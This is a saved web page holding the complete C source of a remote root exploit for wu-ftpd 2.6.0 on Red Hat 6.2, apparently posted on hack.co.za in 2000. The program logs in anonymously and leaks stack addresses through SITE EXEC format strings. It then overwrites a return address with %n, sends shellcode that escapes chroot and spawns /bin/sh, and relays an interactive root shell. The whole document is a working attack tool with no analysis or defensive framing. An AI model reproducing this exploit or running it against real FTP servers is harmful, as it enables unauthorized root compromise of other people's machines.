<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<!-- saved from url=(0042)http://www.hack.co.za/daem0n/ftpd/wu-lnx.c -->
<HTML><HEAD>
<META content="text/html; charset=windows-1252" http-equiv=Content-Type>
<META content="MSHTML 5.00.2920.0" name=GENERATOR></HEAD>
<BODY><XMP>/*
 * Linux wu-ftpd - 2.6.0(1) (tested on RH6.2 wu from rpm)
 *
 * vsz_
 */

#include <sys/socket.h>
#include <sys/types.h>
#include <stdio.h>
#include <netinet/in.h>
#include <netdb.h>

char linuxcode[] =
  "\x31\xc0\x31\xdb\x31\xc9\xb0\x46\xcd\x80\x31\xc0\x31\xdb"
  "\x43\x89\xd9\x41\xb0\x3f\xcd\x80\xeb\x6b\x5e\x31\xc0\x31"
  "\xc9\x8d\x5e\x01\x88\x46\x04\x66\xb9\xff\xff\x01\xb0\x27"
  "\xcd\x80\x31\xc0\x8d\x5e\x01\xb0\x3d\xcd\x80\x31\xc0\x31"
  "\xdb\x8d\x5e\x08\x89\x43\x02\x31\xc9\xfe\xc9\x31\xc0\x8d"
  "\x5e\x08\xb0\x0c\xcd\x80\xfe\xc9\x75\xf3\x31\xc0\x88\x46"
  "\x09\x8d\x5e\x08\xb0\x3d\xcd\x80\xfe\x0e\xb0\x30\xfe\xc8"
  "\x88\x46\x04\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46\x0c"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xb0\x0b\xcd\x80\x31\xc0"
  "\x31\xdb\xb0\x01\xcd\x80\xe8\x90\xff\xff\xff\xff\xff\xff"
  "\x30\x62\x69\x6e\x30\x73\x68\x31\x2e\x2e\x31\x31";


main (int argc, char *argv[])
{

  char cmdbuf[8192];
  char cbuf[1024];
  char *t;
  char nop[400];
  int pip, i, a = 22, st = 0;
  struct sockaddr_in sck;
  struct hostent *hp;
  long inet;
  int port = 21;
  fd_set fds;
  unsigned int aa;
  long reta, retb, tmp, retz;
  int ret;
  int add = 0;

  memset (cmdbuf, 0x0, sizeof (cmdbuf));
  memset (cbuf, 0x0, sizeof (cbuf));
  memset (nop, 0x0, sizeof (nop));

  if (argc < 2)
    {
      fprintf (stderr, "Usage: %s [ip] \n", argv[0]);
      exit (-1);
    }

  pip = socket (PF_INET, SOCK_STREAM, 0);

  if (!pip)
    {
      perror ("socket()");
      exit (-1);
    }

  inet = inet_addr (argv[1]);
  if (inet == -1)
    {
      if (hp = gethostbyname (argv[1]))
	memcpy (&inet, hp->h_addr, 4);
      else
	inet = -1;
      if (inet == -1)
	{
	  fprintf (stderr, "Cant resolv %s!! \n", argv[1]);
	  exit (-1);
	}
    }
  sck.sin_family = PF_INET;
  sck.sin_port = htons (port);
  sck.sin_addr.s_addr = inet;

  if (connect (pip, (struct sockaddr *) &sck, sizeof (sck)) < 0)
    {
      perror ("Connect() ");
      exit (-1);
    }

  read (pip, cbuf, 1023);
  fprintf (stderr, "Connected to: %s \n", argv[1]);
  fprintf (stderr, "Banner: %s \n", cbuf);
  strcpy (cmdbuf, "user ftp\n");
  write (pip, cmdbuf, strlen (cmdbuf));
  memset (nop, 0x90, sizeof (nop) - strlen (linuxcode) - 10);

  strcat (nop, linuxcode);

  memset (cmdbuf, 0x0, sizeof (cmdbuf));
  sprintf (cmdbuf, "pass %s\n", nop);
  write (pip, cmdbuf, strlen (cmdbuf));
  sleep (1);
  read (pip, cmdbuf, sizeof (cmdbuf) - 1);
  memset (cmdbuf, 0x0, sizeof (cmdbuf));
  if (!strncmp (cmdbuf, "530", 3))
    {
      printf ("loggin incorrect : %s \n", cmdbuf);
      exit (-1);
    }
  fprintf (stderr, "Logged in.. \n");
  fprintf (stderr, "+ Finding ret addresses \n");
  memset (cmdbuf, 0x0, sizeof (cmdbuf));
  strcpy (cmdbuf, "SITE EXEC %x %x %x %x +%x |%x\n");
  write (pip, cmdbuf, strlen (cmdbuf));
  sleep (1);
  memset (cmdbuf, 0x0, sizeof (cmdbuf));
  read (pip, cmdbuf, sizeof (cmdbuf) - 1);
  if (!strncmp (cmdbuf + 4, "%x", 2))
    {
      fprintf (stderr, "[1m[31mWuftpd is not vulnerable : %s \n[0m",
	       cmdbuf);
      exit (-1);
    }
  else
    {
      fprintf (stderr, "[1m[32mWuftpd is vulnerable : %s \n[0m", cmdbuf);
    }
  reta = strtoul (strstr (cmdbuf, "|") + 1, strstr (cmdbuf, "|") + 11, 16);
  retz = strtoul (strstr (cmdbuf, "+") + 1, strstr (cmdbuf, "|") + 11, 16);

  memset (cmdbuf, 0x0, sizeof (cmdbuf));
  strcpy (cmdbuf, "SITE EXEC ");
  for (ret = 0; ret <= 88; ret++)
    {
      strcat (cmdbuf, "%x");
    }
  strcat (cmdbuf, "|%x\n");
  write (pip, cmdbuf, strlen (cmdbuf));
  sleep (1);
  memset (cmdbuf, 0x0, sizeof (cmdbuf));
  read (pip, cmdbuf, sizeof (cmdbuf) - 1);
  retb = strtoul (strstr (cmdbuf, "|") + 1, strstr (cmdbuf, "|") + 11, 16);
  printf ("Ret location befor: %x \n", reta);
  if (reta == 0)
    reta = retz;
  else
    add = 600;
  reta = reta - 0x58;
  retb = retb + 100 - 0x2569 - add;
  printf ("Ret      location : %x \n", reta);
  printf ("Proctitle addres  : %x and %u \n", retb, retb);
  sleep (2);
  memset (cmdbuf, 0x0, sizeof (cmdbuf));

  sprintf (cmdbuf, "SITE EXEC aaaaaaaaaaaaaaaaaaaaaaaaaabbbb%c%c\xff%c%c",
	   (reta & 0x000000ff), (reta & 0x0000ff00) >> 8,
	   (reta & 0x00ff0000) >> 16, (reta & 0xff000000) >> 24);
  a = 22;
  memset (cbuf, 0x0, sizeof (cbuf));
  while (1)
    {

      memset (cmdbuf, 0x0, sizeof (cmdbuf));

      sprintf (cmdbuf, "SITE EXEC aaaaaaaaaaaaaaaaaaaaaaaaaabbbb%c%c\xff%c%c",
	       (reta & 0x000000ff), (reta & 0x0000ff00) >> 8,
	       (reta & 0x00ff0000) >> 16, (reta & 0xff000000) >> 24);
      for (i = 0; i <= 128; i++)
	strcat (cmdbuf, "%.f");
      for (i = 0; i <= a; i++)
	strcat (cmdbuf, "%d");
      sprintf (cbuf, "|%%x|%%x\n", aa + 9807 - 460);
      strcat (cmdbuf, cbuf);
      write (pip, cmdbuf, strlen (cmdbuf));
      memset (cmdbuf, 0x0, sizeof (cmdbuf));
      read (pip, cmdbuf, sizeof (cmdbuf) - 1);
      t = (char *) strstr (cmdbuf, "|");
      tmp = strtoul (t + 1, t + 11, 16);
      if (tmp != 0)
	{
	  fprintf (stderr, "tmp 1  : 0x%x\n", tmp);
	  if (tmp == reta)
	    {
	      fprintf (stderr, "Cached a : %d \n", a);
	      st = 1;
	      break;
	    }
	  tmp = strtoul (t + 11, t + 22, 16);
	  fprintf (stderr, "tmp 2  : 0x%x\n", tmp);
	  if (tmp == reta)
	    {
	      fprintf (stderr, "Cached a : %d \n", a);
	      st = 2;
	      break;
	    }
	}
      if (st > 0)
	break;
      a++;
    }
  sleep (1);
  memset (cmdbuf, 0x0, sizeof (cmdbuf));
  memset (cbuf, 0x0, sizeof (cbuf));

  sprintf (cmdbuf, "SITE EXEC aaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbb%c%c\xff%c%c",
	   (reta & 0x000000ff), (reta & 0x0000ff00) >> 8,
	   (reta & 0x00ff0000) >> 16, (reta & 0xff000000) >> 24);
  for (i = 0; i <= 128; i++)
    strcat (cmdbuf, "%.f");
  if (add != 600)
    a = a - 1;
  fprintf (stderr, "Trying with : %d \n", a);
  for (i = 0; i <= a; i++)
    strcat (cmdbuf, "%d");

  aa = retb;
  if (add == 600)
    sprintf (cbuf, "|%%.%ud%%n\n", aa + 9807);
  else
    sprintf (cbuf, "|%%.%ud%%n\n", aa + 9807 - 480);

  strcat (cmdbuf, cbuf);
  write (pip, cmdbuf, strlen (cmdbuf));
  memset (cmdbuf, 0x0, sizeof (cmdbuf));
  read (pip, cmdbuf, sizeof (cmdbuf) - 1);
  memset (cmdbuf, 0x0, sizeof (cmdbuf));

  fprintf (stderr, "[1m[33m Wait for a shell.....\n[0m");


  while (1)
    {
      FD_ZERO (&fds);
      FD_SET (0, &fds);
      FD_SET (pip, &fds);
      select (255, &fds, NULL, NULL, NULL);
      if (FD_ISSET (pip, &fds))
	{
	  memset (cbuf, 0x0, sizeof (cbuf));
	  ret = read (pip, cbuf, sizeof (cbuf) - 1);
	  if (ret <= 0)
	    {
	      printf ("Connection closed - EOF \n");
	      exit (-1);
	    }
	  printf ("%s", cbuf);
	}
      if (FD_ISSET (0, &fds))
	{
	  memset (cbuf, 0x0, sizeof (cbuf));
	  read (0, cbuf, sizeof (cbuf) - 1);
	  write (pip, cbuf, strlen (cbuf));
	}
    }
  close (pip);
}
/*                   www.hack.co.za   [26 September 2000]*/</XMP></BODY></HTML>
